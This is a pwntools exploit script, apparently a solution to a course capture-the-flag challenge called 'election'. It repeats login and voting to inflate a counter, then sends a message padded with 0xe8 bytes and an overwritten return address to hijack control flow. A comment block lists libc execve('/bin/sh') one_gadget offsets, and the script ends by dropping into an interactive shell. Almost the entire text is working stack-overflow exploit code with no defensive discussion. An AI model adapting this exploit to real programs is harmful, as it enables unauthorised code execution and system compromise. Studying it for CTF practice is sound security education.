import binascii
from pwn import *

context.arch = 'amd64'
# context.terminal = ['tmux', 'splitw', '-h']

p = process('./election', env={'LD_PRELOAD': '../hw7/libc.so'})
# p = remote('edu-ctf.csie.org', 10180)
gdb.attach(p, 'b main\nc\n')

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

token = 'aaaa'

def login():
    p.sendlineafter('>', '2')
    p.sendlineafter('token:', token)
    p.sendlineafter('>', '1')
    p.sendlineafter('Token:', token)

votes = 0xf0

for i in range(votes // 10 + 1):
    print('owo', i)
    login()

    for _ in range(10 if i < votes // 10 else (votes % 10)):
        p.sendlineafter('>', '1')
        p.sendlineafter('[0~9]: ', '0')
    p.sendlineafter('>', '3')

login()

p.sendlineafter('>', '2')
p.sendlineafter('To [0~9]:', '0')
p.sendlineafter('Message:', b'A' * 0xe8 + p64(0x555555554ffb))

p.interactive()
